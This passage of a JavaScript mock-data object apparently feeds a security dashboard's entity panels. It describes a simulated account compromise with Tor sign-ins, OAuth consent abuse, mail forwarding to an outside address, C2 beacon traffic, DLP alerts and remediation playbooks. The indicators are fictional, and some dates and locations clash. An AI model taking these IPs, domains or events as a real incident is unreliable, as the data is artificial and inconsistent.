          'Privileged Groups':'None (but WriteDACL on SVC_Backup)',
          'Stale Account':'No — active daily',
          'Service Account':'No',
          'Last Password Change':'2025-11-14'
        }
      },
      accountLockouts: {
        label: 'Account Lockout History', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:30:55', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Locking DC':'DC01.contoso.local', 'Source Computer':'Unknown', 'Event ID':'4740' } },
          { time:'18 Feb 2026  09:12:30', dot:'orange',
            details: { 'User':'m.henderson', 'Locking DC':'DC02.contoso.local', 'Source Computer':'CORP-WS-045', 'Event ID':'4740' } }
        ]
      },
      passwordHistory: {
        label: 'Password Change / Reset History', expanded: false, viewAll: true,
        timeline: [
          { time:'25 Nov 2025  10:22:15', dot:'green',
            details: { 'Operation':'Self-service password change', 'Caller':'m.henderson', 'Target':'m.henderson', 'Source':'On-Premises AD (4723)', 'Result':'Success' } },
          { time:'25 Nov 2025  10:23:05', dot:'green',
            details: { 'Operation':'Change user password', 'Caller':'m.henderson', 'Target':'m.henderson@contoso.com', 'Source':'Entra ID (Azure AD)', 'Result':'Success' } },
          { time:'14 Aug 2025  09:08:00', dot:'orange',
            details: { 'Operation':'Reset password (by admin)', 'Caller':'admin@contoso.com', 'Target':'m.henderson@contoso.com', 'Source':'Entra ID', 'Result':'Success' } }
        ]
      },
      groupMembershipChanges: {
        label: 'Group Membership Changes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:35:40', dot:'red', malicious: true,
            details: { 'Operation':'Add member to group', 'Group':'SharePoint-Finance-Editors', 'Caller':'m.henderson', 'Source':'Entra ID' } },
          { time:'15 Jan 2026  06:45:00', dot:'green',
            details: { 'Operation':'Add member to group', 'Group':'VPN-Users', 'Caller':'admin@contoso.com', 'Source':'On-Premises AD (4732)' } },
          { time:'10 Oct 2025  11:30:00', dot:'green',
            details: { 'Operation':'Add member to group', 'Group':'IT-Support', 'Caller':'admin@contoso.com', 'Source':'On-Premises AD (4732)' } }
        ]
      },
      mailboxForwarding: {
        label: 'Mailbox Forwarding Rules', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:40:22', dot:'red', malicious: true,
            details: { 'Operation':'New-InboxRule', 'Mailbox':'m.henderson@contoso.com', 'Rule Name':'_sync_rule_', 'ForwardTo':'ext-backup-1847@protonmail.com', 'Creator IP':'185.220.101.42' } }
        ]
      },
      recentAppAccess: {
        label: 'Recent Application Access', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            details: { 'Application':'FileSync Pro (Unregistered) ⚠', 'Source IP':'185.220.101.42 (Tor)', 'Risk Level':'High', 'Result':'Success' } },
          { time:'11 May 2026  09:32:10', dot:'red', malicious: true,
            details: { 'Application':'Azure Portal', 'Source IP':'185.220.101.42 (Tor)', 'Risk Level':'High', 'Result':'Success' } },
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'Application':'Outlook Web', 'Source IP':'10.18.1.81 (NYC Office)', 'Risk Level':'None', 'Result':'Success' } },
          { time:'11 May 2026  10:15:22', dot:'green',
            details: { 'Application':'Microsoft Teams', 'Source IP':'10.18.1.81 (NYC Office)', 'Risk Level':'None', 'Result':'Success' } },
          { time:'11 May 2026  10:05:00', dot:'green',
            details: { 'Application':'SharePoint Online', 'Source IP':'10.18.1.81 (NYC Office)', 'Risk Level':'None', 'Result':'Success' } }
        ]
      },
      networkActivity: {
        label: 'Network Activity (24h)', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:44', dot:'red', malicious: true,
            details: { 'Type':'DNS Query', 'Domain':'c2-update.darkoperator.net', 'Resolution':'185.220.101.99', 'Source Host':'CORP-WS-045' } },
          { time:'11 May 2026  10:34:12', dot:'red', malicious: true,
            details: { 'Type':'Firewall Allow', 'Destination':'185.220.101.42:443', 'Protocol':'TLS 1.2', 'Bytes Out':'4.2 MB', 'Bytes In':'128 KB', 'Duration':'2m 18s' } },
          { time:'11 May 2026  10:30:05', dot:'orange',
            details: { 'Type':'Proxy Log', 'URL':'https://paste.ee/api/v1/submit', 'Method':'POST', 'User-Agent':'PowerShell/7.2' } },
          { time:'11 May 2026  09:58:22', dot:'orange',
            details: { 'Type':'DNS Query', 'Domain':'raw.githubusercontent.com', 'Resolution':'185.199.108.133', 'Source Host':'CORP-WS-045' } }
        ],
        viewAllData: [
          { time:'11 May 2026  10:35:44', dot:'red', malicious: true,
            details: { 'Type':'DNS Query', 'Domain':'c2-update.darkoperator.net', 'Resolution':'185.220.101.99', 'Source Host':'CORP-WS-045' } },
          { time:'11 May 2026  10:34:12', dot:'red', malicious: true,
            details: { 'Type':'Firewall Allow', 'Destination':'185.220.101.42:443', 'Protocol':'TLS 1.2', 'Bytes Out':'4.2 MB', 'Bytes In':'128 KB', 'Duration':'2m 18s' } },
          { time:'11 May 2026  10:30:05', dot:'orange',
            details: { 'Type':'Proxy Log', 'URL':'https://paste.ee/api/v1/submit', 'Method':'POST', 'User-Agent':'PowerShell/7.2' } },
          { time:'11 May 2026  09:58:22', dot:'orange',
            details: { 'Type':'DNS Query', 'Domain':'raw.githubusercontent.com', 'Resolution':'185.199.108.133', 'Source Host':'CORP-WS-045' } },
          { time:'11 May 2026  09:32:15', dot:'red', malicious: true,
            details: { 'Type':'VPN Connection', 'Source IP':'185.220.101.42 (Tor)', 'Assigned IP':'10.18.99.14', 'Protocol':'OpenVPN', 'Duration':'48m' } },
          { time:'11 May 2026  09:15:00', dot:'green',
            details: { 'Type':'VPN Connection', 'Source IP':'72.14.201.88 (NY Office ISP)', 'Assigned IP':'10.18.1.81', 'Protocol':'IPSec', 'Duration':'5h 22m' } }
        ]
      },
      threatIntelContext: {
        label: 'Threat Intelligence Context', expanded: false,
        kv: {
          'Primary IOC':'185.220.101.42 (Tor Exit Node)',
          'VirusTotal':'12/94 vendors flagged as malicious',
          'First Seen (Global)':'2025-11-22',
          'MITRE Techniques':'T1071.001 (Web Protocols), T1041 (Exfil Over C2), T1557.002 (ARP Poisoning)'
        }
      },
      dlpIncidents: {
        label: 'DLP Incidents', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:34:50', dot:'red', malicious: true,
            details: { 'Policy':'PII Data Transfer — External', 'Action':'Alert (not blocked)', 'File':'HR_Benefits_Q1_2026.xlsx', 'Destination':'185.220.101.42 (C2)' } },
          { time:'11 May 2026  10:30:10', dot:'orange',
            details: { 'Policy':'Code Upload — External Paste Site', 'Action':'Alert (not blocked)', 'File':'stdin (PowerShell output)', 'Destination':'paste.ee' } }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Malicious — Compromised Account',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Determine Entry Vector', desc:'Investigate how m.henderson\'s credentials were compromised — phishing email, brute force, token replay, or session hijack? Review email logs and sign-in risk events for the entry point.', priority:'Critical' },
            { icon:'🧩', title:'Assess Full Compromise Scope', desc:'Map every resource accessed post-compromise: 24 SharePoint files, 3 OAuth tokens, C2 beacon, SAM dump attempt. Determine what data is now in attacker hands.', priority:'Critical' },
            { icon:'📝', title:'Evaluate Regulatory Impact', desc:'EU employee PII potentially exposed (Employee_Salary_Data.csv). Assess GDPR Art.33 notification requirements (72h deadline). Engage Legal and DPO.', priority:'High' },
            { icon:'📊', title:'Profile the Attacker', desc:'Tor exit node (Romania), Cobalt Strike C2, service masquerading — assess if this matches known APT TTPs. Cross-reference IOCs with threat intel for campaign identification.', priority:'High' },
            { icon:'🔍', title:'Check for Insider Threat', desc:'Determine if m.henderson is a compromised victim or a malicious insider. Review HR records, recent behavior changes, and access pattern anomalies prior to the alert.', priority:'Medium' }
          ],
          playbooks: [
            { name:'Credential Compromise Response', id:'PB-CRED-001', desc:'Disable account → Revoke tokens → Reset password → Notify manager → Create incident', status:'Ready', estimatedTime:'2 min', urgency:'Run Immediate' },
            { name:'Lateral Movement Containment', id:'PB-LAT-002', desc:'Isolate endpoint → Block C2 IPs → Scan peer devices → Hunt for IOCs across tenant', status:'Ready', estimatedTime:'5 min', urgency:'Run Immediate' },
            { name:'Data Exfiltration Investigation', id:'PB-EXFIL-003', desc:'Audit file access logs → Classify exposed data → Generate DLP incident → Notify data owners', status:'Ready', estimatedTime:'8 min', urgency:'High Priority' },
            { name:'NTLM Credential Sweep', id:'PB-NTLM-004', desc:'Scan all domain controllers for pass-the-hash artifacts. Check SVC_Backup group for WriteDACL abuse.', status:'Ready', estimatedTime:'12 min', urgency:'High Priority' }
          ]
        }
      }
    }
  },
  'svc-azure-ad': {
    type: 'service', modalTitle: 'Service Details · Azure AD Portal',
    sections: {
      serviceDetails: {
        label: 'Service Details', expanded: true,
        kv: {
          'Service':'Azure AD Portal (Entra ID)',
          'Category':'Identity & Access Management',
          'Provider':'Microsoft',
          'Region':'Global (Multi-region)',
          'Tenant ID':'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
          'Tenant Name':'contoso.onmicrosoft.com',
          'License':'Entra ID P2',
          'Status':'Active',
          'Triggered By':'Sign-In Anomaly — Impossible Travel'
        }
      },
      oauthConsentGrants: {
        label: 'OAuth App Consent Grants', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            details: { 'Operation':'Consent to application', 'App':'FileSync Pro ⚠ (Unverified publisher)', 'Consenting User':'m.henderson', 'Permissions':'Files.ReadWrite.All, Mail.ReadWrite', 'Source IP':'185.220.101.42 (Tor)', 'Admin Consent':'No — user self-consented' } },
          { time:'15 Apr 2026  09:00:00', dot:'green',
            details: { 'Operation':'Add delegated permission grant', 'App':'Microsoft Teams', 'Consenting User':'admin@contoso.com', 'Permissions':'User.Read, Chat.ReadWrite', 'Source IP':'10.0.0.5 (Admin-WS)', 'Admin Consent':'Yes' } }
        ]
      },
      adminActivity: {
        label: 'Admin Activity on Service', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:35:40', dot:'red', malicious: true,
            details: { 'Operation':'Add member to group', 'Target':'SharePoint-Finance-Editors', 'Caller':'m.henderson (compromised session)', 'Workload':'AzureActiveDirectory', 'Source IP':'185.220.101.42 (Tor)' } },
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            details: { 'Operation':'Consent to application', 'Target':'FileSync Pro', 'Caller':'m.henderson', 'Workload':'AzureActiveDirectory', 'Source IP':'185.220.101.42' } },
          { time:'10 May 2026  10:00:00', dot:'green',
            details: { 'Operation':'Update conditional access policy', 'Target':'Block Legacy Auth', 'Caller':'admin@contoso.com', 'Workload':'AzureActiveDirectory', 'Source IP':'10.0.0.5' } }
        ]
      },
      conditionalAccess: {
        label: 'Conditional Access Policies', expanded: false, viewAll: true,
        timeline: [
          { time:'01 Apr 2025  10:00:00', dot:'green',
            details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'All cloud apps', 'Grant':'Require MFA', 'Exclusions':'Break-glass accounts', 'Last Modified':'2025-04-01' } },
          { time:'15 Mar 2025  09:30:00', dot:'red',
            details: { 'State':'Report-Only ⚠ (Not enforced)', 'Scope':'All users', 'Conditions':'Exchange ActiveSync, Other Clients', 'Grant':'Block', 'Impact':'Would block 142 connections/week', 'Last Modified':'2025-03-15' } },
          { time:'20 May 2025  11:15:00', dot:'green',
            details: { 'State':'Enabled', 'Scope':'All users', 'Conditions':'Sign-in risk: Medium, High', 'Grant':'Require MFA + password change', 'Exclusions':'None', 'Last Modified':'2025-05-20' } }
        ]
      },
      signInAudit: {
        label: 'Recent Sign-In Audit', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'IP':'185.220.101.42 (Tor)', 'Location':'Bucharest, Romania', 'App':'Azure Portal', 'MFA':'Satisfied via token (replay?)', 'Risk':'High', 'Result':'Success' } },
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'User':'m.henderson', 'IP':'10.18.1.81', 'Location':'Austin, TX, USA', 'App':'Outlook Web', 'MFA':'Push notification approved', 'Risk':'None', 'Result':'Success' } },
          { time:'11 May 2026  13:58:22', dot:'orange',
            details: { 'User':'j.williams', 'IP':'10.18.1.55', 'Location':'Austin, TX, USA', 'App':'Azure Portal', 'MFA':'Challenged', 'Risk':'Low', 'Result':'Interrupted' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:32:00', dot:'red',
            viewOnGraph: { nodeId:'alert-impossible-travel', label:'Impossible Travel', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-impossible-travel',
            detailsGrid: [
              { label:'09:32:00 Impossible Travel', value:'UEBA Anomaly', tag:'Type', tagVal:'UEBA', mitre:'T1078.004 (Valid Accounts: Cloud)', source:'Azure AD', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  09:33:15', dot:'red',
            viewOnGraph: { nodeId:'alert-oauth-token', label:'Suspicious OAuth Token', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-oauth-token',
            detailsGrid: [
              { label:'09:33:15 Suspicious OAuth Token', value:'Broad Scope', tag:'Type', tagVal:'Cloud Security', mitre:'T1550.001 (Application Access Token)', source:'Azure AD', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  09:35:00', dot:'orange',
            viewOnGraph: { nodeId:'alert-app-consent', label:'New App Consent', icon:'🔔', sourceEntity:'svc-azure-ad' },
            alertProfileId: 'alert-app-consent',
            detailsGrid: [
              { label:'09:35:00 New App Consent — FileSync Pro', value:'Unregistered App', tag:'Type', tagVal:'App Governance', mitre:'T1098.003 (Additional Cloud Roles)', source:'Azure AD', status:'Open', severity:'Medium' }
            ] }
        ]
      },
      processes: {
        label: 'Related Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-oauth', label:'OAuth Token (FileSync Pro)', icon:'⚙', sourceEntity:'svc-azure-ad' },
            details: { 'Process Name':'OAuth Token (FileSync Pro)', 'Type':'Bearer Token', 'Grant':'Authorization Code', 'Scope':'Mail.ReadWrite, Files.ReadWrite.All', 'Status':'Active — Revocation recommended' } },
          { time:'11 May 2026  09:32:10', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-powershell', label:'powershell.exe', icon:'⚙', sourceEntity:'svc-azure-ad' },
            details: { 'Process Name':'powershell.exe', 'Context':'Triggered via AzureAD PowerShell module', 'Source IP':'185.220.101.42 (Tor)', 'User':'m.henderson', 'Status':'Running on CORP-WS-045' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'svc-azure-ad' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Token used to deploy masquerading service', 'Host':'CORP-WS-045', 'Status':'Running — Stop recommended' } },
          { time:'11 May 2026  09:20:05', dot:'green',
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'svc-azure-ad' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Authenticated via Azure AD SSO', 'Tenant':'contoso.sharepoint.com', 'Status':'Active — Access revoked for m.henderson' } }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Suspicious — Anomalous Sign-In Activity',
          severity: 'high',
          recommendations: [
            { icon:'�', title:'Identify Conditional Access Gaps', desc:'Review which conditional access policies failed to prevent the malicious sign-in. Was location-based blocking configured? Were Tor exit nodes in the named locations list?', priority:'Critical' },
            { icon:'🧩', title:'Assess Tenant-Wide Impact', desc:'Check if other users show similar anomalous sign-in patterns. The attacker may have compromised additional accounts through the same campaign.', priority:'High' },
            { icon:'📊', title:'Evaluate Legacy Auth Exposure', desc:'Determine if legacy authentication protocols (IMAP, SMTP, POP3) were used to bypass MFA. Review sign-in logs for non-modern auth client applications.', priority:'High' },
            { icon:'📝', title:'Review App Registration Abuse', desc:'Investigate if the attacker registered additional apps beyond FileSync Pro. Audit all app registrations from the past 7 days for suspicious publishers.', priority:'Medium' }
          ],
          playbooks: [
            { name:'Azure AD Security Hardening', id:'PB-AAD-001', desc:'Apply conditional access → Block legacy auth → Enable risky sign-in detection → Review app consents', status:'Ready', estimatedTime:'5 min', urgency:'Standard' },
            { name:'Suspicious Sign-In Investigation', id:'PB-SIGNIN-002', desc:'Correlate sign-in logs → Map affected users → Check MFA bypass → Generate incident report', status:'Ready', estimatedTime:'3 min', urgency:'High Priority' }
          ]
        }
      }
    }
  },
  'ip-tor': {
    type: 'ip', modalTitle: 'IP Details · 185.220.101.42',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 98,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Known Malicious IP',
          metrics: [
            { icon:'🌐', label:'Tor Exit Node', value:'Confirmed', color:'#DD1616' },
            { icon:'⚠', label:'Threat Feeds Flagged', value:'5', color:'#DD1616' },
            { icon:'🔗', label:'Active Connections', value:'4', color:'#FF5900' },
            { icon:'�', label:'VirusTotal Detections', value:'12/89', color:'#FF5900' }
          ],
          firstSeen: '2025-06-04 09:32 UTC',
          lastActivity: '2025-06-04 10:37 UTC'
        }
      },
      ipDetails: {
        label: 'IP Details', expanded: true,
        kv: {
          'IP Address':'185.220.101.42',
          'Geo Location':'Romania 🇷🇴',
          'Network Type':'Tor Exit Relay',
          'First Seen':'2025-06-04 09:32 UTC',
          'Last Seen':'2025-06-04 10:37 UTC',
          'Firewall Events (24h)':'4 (2 denied, 2 allowed)',
          'Protocols':'HTTPS (443), HTTP (8080)'
        }
      },
      threatIntelligence: {
        label: 'Threat Intelligence', expanded: true, viewAll: true,
        timeline: [
          { time:'VirusTotal', dot:'red', malicious: true,
            details: { 'Detection':'12 / 89 vendors flagged', 'Last Analysis':'2025-06-03' } },
          { time:'ADSThreatAnalyticsFeeds', dot:'red', malicious: true,
            details: { 'Feed':'Log360 Threat Analytics', 'Category':'Known Tor Exit Node', 'Confidence':'High', 'Last Updated':'2025-06-04' } }
        ]
      },
      connectionHistory: {
        label: 'Connection History', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
            details: { 'Direction':'Outbound', 'Source Host':'CORP-WS-045', 'Dest IP':'185.220.101.42', 'Dest Port':'443', 'Bytes Sent':'14.2 KB', 'Bytes Received':'1.8 KB', 'Duration':'12s', 'Action':'Allow', 'Device':'Fortinet FG-600E' } },
          { time:'11 May 2026  10:36:45', dot:'red', malicious: true,
            details: { 'Direction':'Outbound', 'Source Host':'CORP-WS-045', 'Dest IP':'185.220.101.42', 'Dest Port':'8080', 'Bytes Sent':'0.4 KB', 'Bytes Received':'842 KB', 'Duration':'3s', 'Action':'Allow', 'Device':'Fortinet FG-600E' } }
        ]
      },
      firewallSummary: {
        label: 'Firewall Action Summary', expanded: false,
        kv: {
          'Total Flows':'47',
          'Allowed':'12 ⚠ (pre-block)',
          'Denied':'35 (post-block)',
          'Top Dest Ports':'443 (HTTPS), 8080 (HTTP-Alt), 53 (DNS)',
          'Protocols':'TCP (44), UDP (3)',
          'First Allowed':'11 May 2026  09:32:10',
          'First Blocked':'11 May 2026  10:38:00 (after perimeter rule added)',
          'Source Devices':'Fortinet FG-600E (fw-edge-01)'
        }
      },
      dnsHistory: {
        label: 'DNS Query History', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:44', dot:'red', malicious: true,
            details: { 'Domain':'c2-update.darkoperator.net', 'Record Type':'A', 'Resolution':'185.220.101.42', 'Querying Process':'powershell.exe (PID 4892)', 'Source':'Sysmon Event 22' } },
          { time:'11 May 2026  10:36:45', dot:'red', malicious: true,
            details: { 'Domain':'staging-payload.net', 'Record Type':'A', 'Resolution':'185.220.101.42', 'Querying Process':'certutil.exe', 'Source':'Sysmon Event 22' } }
        ]
      },
      idsAlerts: {
        label: 'IDS/IPS Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:50', dot:'red', malicious: true,
            details: { 'Signature':'ET TROJAN Cobalt Strike Beacon C2 Traffic', 'Threat ID':'2024217', 'Severity':'Critical', 'Action':'Alert (not blocked)', 'Source':'PaloAlto PA-5260' } },
          { time:'11 May 2026  10:37:02', dot:'red', malicious: true,
            details: { 'Signature':'ET POLICY Known Tor Exit Node Traffic', 'Threat ID':'2520001', 'Severity':'High', 'Action':'Deny', 'Source':'Fortinet FG-600E' } },
          { time:'11 May 2026  09:32:15', dot:'orange',
            details: { 'Signature':'ET POLICY Possible Social Engineering', 'Threat ID':'2025041', 'Severity':'Medium', 'Action':'Alert', 'Source':'PaloAlto PA-5260' } }
        ]
      },
      geoContext: {
        label: 'Geo & Network Context', expanded: false,
        kv: {
          'Country':'Romania',
          'VPN/Proxy':'Yes — Tor Exit Node',
          'Threat Feed Match':'Listed (Webroot BrightCloud)'
        }
      },
      associatedUsers: {
        label: 'Associated Users', expanded: true,
        kv: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success (MFA bypassed — token replay suspected)' }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Azure Portal', 'MFA':'Satisfied via token (replay suspected)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'11 May 2026  09:33:45', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'SSO (token reuse)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'10 May 2026  21:15:33', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Azure Portal', 'MFA':'Not reached', 'Result':'Failure — Invalid password', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } }
        ],
        viewAllData: [
          { time:'11 May 2026  09:32:10', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'Azure Portal', 'MFA':'Satisfied via token (replay suspected)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'11 May 2026  09:33:45', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Cloud Sign-In (Azure AD)', 'Source App':'SharePoint Online', 'MFA':'SSO (token reuse)', 'Result':'Success', 'Risk Level':'High', 'Location':'Bucharest, Romania' } },
          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
            details: { 'User':'m.henderson', 'Logon Type':'Outbound C2 Connection', 'Source App':'powershell.exe', 'MFA':'N/A', 'Result':'Connected — 12s', 'Risk Level':'Critical', 'Location':'Bucharest, Romania' } },
          { time:'10 May 2026  21:15:33', dot:'orange',
            details: { 'User':'unknown', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Azure Portal', 'MFA':'Not reached', 'Result':'Failure — Invalid password', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } },
          { time:'10 May 2026  18:40:11', dot:'orange',
            details: { 'User':'j.williams', 'Logon Type':'Failed Sign-In Attempt', 'Source App':'Exchange Online', 'MFA':'Not reached', 'Result':'Failure — Account locked', 'Risk Level':'Medium', 'Location':'Bucharest, Romania' } }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: true, noCollapse: true,
        remediationData: {
          verdict: 'Malicious — Known Tor Exit Node / C2 Infrastructure',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Investigate Historical Connections', desc:'Search 90-day firewall, proxy, and VPN logs for any prior connections to 185.220.101.42. Determine if this is a first-time contact or a long-running C2 channel.', priority:'Critical' },
            { icon:'🧩', title:'Assess IP Role in Attack Chain', desc:'Determine if this Tor exit node was used as the entry point (stolen creds from Tor), the C2 relay, or the exfiltration destination. The role determines remediation priority.', priority:'Critical' },
            { icon:'📊', title:'Cross-Reference with Threat Intel', desc:'Check 185.220.101.42 against ThreatFox, AbuseIPDB, VirusTotal, and internal TI platforms. Identify associated campaigns, APT groups, or malware families.', priority:'High' },
            { icon:'📝', title:'Map the C2 Infrastructure', desc:'Investigate c2-update.darkoperator.net — DNS history, passive DNS, WHOIS. Is there a broader C2 infrastructure with additional domains/IPs?', priority:'High' },
            { icon:'🔍', title:'Check for Other Affected Users', desc:'Determine if other corporate users or devices connected to any IPs in ASN AS9009 (M247 Europe). This may indicate a wider compromise.', priority:'Medium' }
          ],
          playbooks: [
            { name:'Malicious IP Blocking', id:'PB-IPBLK-001', desc:'Block IP at firewall → Update proxy rules → Add to DNS sinkhole → Verify no active sessions', status:'Ready', estimatedTime:'2 min', urgency:'Run Immediate' },
            { name:'Tor Network Hunt', id:'PB-TOR-002', desc:'Search 90-day logs → Identify all users/devices → Map connection timeline → Generate affected entity list', status:'Ready', estimatedTime:'10 min', urgency:'High Priority' },
            { name:'C2 Infrastructure Takedown', id:'PB-C2-003', desc:'Block C2 domain → Sinkhole DNS → Search for beacon patterns → Quarantine affected endpoints', status:'Ready', estimatedTime:'6 min', urgency:'Run Immediate' }
          ]
        }
      }
    }
  },
  'ip-internal': {
    type: 'ip', modalTitle: 'IP Details · 10.18.1.81',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 15,
          maxScore: 100,
          severity: 'Low',
          metrics: [
            { icon:'🏢', label:'Network Zone', value:'Internal', color:'#198019' },
            { icon:'🔗', label:'Unique Destinations', value:'34', color:'#0891b2' },
            { icon:'⚠', label:'Anomalous Flows', value:'2', color:'#D14900' },
            { icon:'👤', label:'Assigned User', value:'m.henderson', color:'#6366B3' },
            { icon:'📡', label:'Traffic (24h)', value:'1.45 GB', color:'#0891b2' }
          ],
          firstSeen: '2024-03-15 09:00 UTC',
          lastActivity: '2025-06-04 09:20 UTC'
        }
      },
      ipDetails: {
        label: 'IP Details', expanded: true,
        kv: {
          'IP Address':'10.18.1.81',
          'DHCP':'Static Assignment',
          'Last Seen':'2025-06-04 09:20 UTC',
          'Network Zone':'Internal — Trusted'
        }
      },
      geoContext: {
        label: 'Geo & Network Context', expanded: false,
        kv: {
          'Network Type':'Corporate LAN',
          'VPN/Proxy':'No',
          'Threat Feed Match':'Not listed (internal)'
        }
      },
      associatedUsers: {
        label: 'Associated Users', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:20:00', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Azure AD sign-in', 'Result':'Success', 'MFA':'Push approved', 'Location':'NYC Office' } },
          { time:'11 May 2026  10:15:22', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Interactive logon', 'Result':'Success', 'Source':'CORP-WS-045' } },
          { time:'10 May 2026  09:05:11', dot:'green',
            details: { 'User':'m.henderson', 'Action':'Network logon', 'Result':'Success', 'Source':'File Share \\\\fs01' } }
        ]
      },
      associatedDevices: {
        label: 'Associated Devices', expanded: true,
        kv: {
          'Device':'CORP-WS-045 (Primary)',
          'MAC':'A4:5E:60:B2:14:7C',
          'DHCP Lease':'Static — Reserved'
        }
      },
      connectionHistory: {
        label: 'Connection History', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:20:05', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'login.microsoftonline.com', 'Port':'443', 'Protocol':'HTTPS', 'Bytes':'12 KB', 'Duration':'2s' } },
          { time:'11 May 2026  09:18:30', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'contoso.sharepoint.com', 'Port':'443', 'Protocol':'HTTPS', 'Bytes':'84 KB', 'Duration':'15s' } },
          { time:'11 May 2026  13:45:12', dot:'green',
            details: { 'Direction':'Inbound', 'Source':'10.18.1.1 (Gateway)', 'Port':'—', 'Protocol':'ARP', 'Bytes':'64 B', 'Note':'Normal ARP response' } },
          { time:'11 May 2026  10:15:00', dot:'green',
            details: { 'Direction':'Outbound', 'Destination':'dc01.contoso.local', 'Port':'389', 'Protocol':'LDAP', 'Bytes':'4 KB', 'Duration':'<1s' } }
        ]
      },
      trafficSummary: {
        label: 'Traffic Summary (24h)', expanded: false,
        kv: {
          'Total Flows':'1,247',
          'Unique Destinations':'34',
          'Internal Traffic':'92%',
          'External Traffic':'8% (Azure, Microsoft CDN)',
          'Bytes Sent':'248 MB',
          'Bytes Received':'1.2 GB',
          'Anomalous Flows':'2 (to Tor exit relay ⚠)',
          'Blocked Connections':'0'
        }
      },
      vpnSessions: {
        label: 'VPN Session History', expanded: false, viewAll: true,
        timeline: [
          { time:'09 May 2026  18:30:00', dot:'green',
            details: { 'VPN User':'m.henderson', 'VPN Name':'Corp-SSL-VPN', 'Action':'Tunnel Up', 'Remote IP':'72.34.112.55 (Residential ISP)', 'Assigned IP':'10.18.1.81', 'Duration':'2h 15m', 'Bytes Sent':'142 MB', 'Bytes Received':'380 MB', 'Source':'Fortinet FG-600E' } },
          { time:'28 Mar 2026  19:00:00', dot:'green',
            details: { 'VPN User':'m.henderson', 'VPN Name':'Corp-SSL-VPN', 'Action':'Tunnel Up', 'Remote IP':'72.34.112.55', 'Assigned IP':'10.18.1.81', 'Duration':'1h 45m', 'Bytes Sent':'85 MB', 'Bytes Received':'210 MB', 'Source':'Fortinet FG-600E' } }
        ]
      },
      logonActivity: {
